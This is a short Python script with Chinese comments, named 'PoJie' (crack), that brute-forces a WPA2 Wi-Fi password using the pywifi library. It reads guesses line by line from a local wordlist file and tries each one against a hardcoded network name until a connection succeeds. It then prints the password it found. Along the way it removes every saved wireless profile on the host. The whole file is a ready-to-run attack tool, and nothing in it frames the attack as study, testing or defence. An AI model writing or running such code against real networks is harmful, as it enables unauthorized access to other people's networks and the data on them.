import pywifi
import time
from pywifi import const

class PoJie():
    def __init__(self, path):
        self.file = open(path, "r", errors="ignore")
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个无限网卡
        self.iface.disconnect()  # 断开所有链接

        # 测试网卡是否属于断开状态，
        while True:
            time.sleep(0.2)
            if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                break

        # 扫描wifi
        # self.iface.scan()  # 扫描
        # bessis = self.iface.scan_results()
        # for data in bessis:
        #     print(data.ssid)  # 输出wifi名称

        """
        the status of the wifi:
        const.IFACE_DISCONNECTED  = 0
        const.IFACE_SCANNING  = 1
        const.IFACE_INACTIVE  = 2
        const.IFACE_CONNECTING  = 3
        const.IFACE_CONNECTED = 4
        """

    def readPassWord(self):
        print("开始破解：")
        while True:

            try:
                myStr = self.file.readline()
                if not myStr:
                    break
                bool1 = self.connect(myStr)
                if bool1:
                    print("密码正确：", myStr)
                    break
                else:
                    print("密码错误:" + myStr)
            except:
                continue


    def connect(self, findStr):  # 测试链接

        profile = pywifi.Profile()  # 创建wifi链接文件
        profile.ssid = "bgkj140301"  # wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = findStr  # 密码

        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件

        tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
        self.iface.connect(tmp_profile)  # 链接

        while True:
            time.sleep(0.5)
            if self.iface.status() in [const.IFACE_CONNECTED]:  # 判断是否连接上
                result = True
                break
            elif self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                self.iface.disconnect()  # 断开
                result = False
                break

        return result

    def __del__(self):
        self.file.close()

xx = PoJie("D:/wifi1.txt")
xx.readPassWord()